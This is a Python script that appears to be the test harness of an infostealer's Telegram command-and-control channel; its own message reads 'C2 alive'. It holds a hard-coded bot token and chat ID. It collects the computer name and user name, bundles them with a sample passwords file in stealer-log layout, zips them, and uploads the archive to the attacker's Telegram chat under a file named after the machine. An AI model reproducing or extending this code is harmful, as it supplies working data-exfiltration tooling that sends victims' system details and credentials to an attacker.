import os
import requests
import zipfile
import io
from datetime import datetime

# ===== CONFIG =====
BOT_TOKEN = "8754800241:AAGMuQUWRdiJ2uorie6hL451zeXD1KtGbC8"
CHAT_ID = "6759486932"
ZIP_PASSWORD = "Test123"

# ===== TEST TELEGRAM =====
def test_telegram():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": "✅ Test message - C2 alive"}
    r = requests.post(url, json=payload)
    return r.status_code == 200

# ===== TEST DATA COLLECTION =====
def test_collect():
    data = {
        "Test": {
            "system.txt": f"Machine: {os.environ.get('COMPUTERNAME', 'unknown')}\nUser: {os.environ.get('USERNAME', 'unknown')}\nTime: {datetime.now()}"
        },
        "Sample": {
            "passwords.txt": "test.com:user:pass123\n"
        }
    }
    return data

# ===== TEST ZIP =====
def test_zip(data):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for folder, files in data.items():
            for filename, content in files.items():
                zf.writestr(f"{folder}/{filename}", content)
    buffer.seek(0)
    return buffer

# ===== TEST SEND =====
def test_send_file(buffer, filename):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    files = {"document": (filename, buffer, "application/zip")}
    payload = {"chat_id": CHAT_ID, "caption": "✅ Test file - working"}
    r = requests.post(url, files=files, data=payload)
    return r.status_code == 200

# ===== RUN =====
if __name__ == "__main__":
    # 1. Test message
    if test_telegram():
        print("[+] Telegram message sent")
    else:
        print("[-] Telegram message failed - check token/chat ID")
    
    # 2. Collect test data
    data = test_collect()
    print(f"[+] Test data collected: {len(data)} folders")
    
    # 3. Create zip
    buffer = test_zip(data)
    print(f"[+] ZIP created: {buffer.getbuffer().nbytes} bytes")
    
    # 4. Send file
    if test_send_file(buffer, f"test_{os.environ.get('COMPUTERNAME', 'unknown')}.zip"):
        print("[+] File sent to Telegram")
    else:
        print("[-] File send failed")
    
    print("[+] Test complete. Check Telegram.")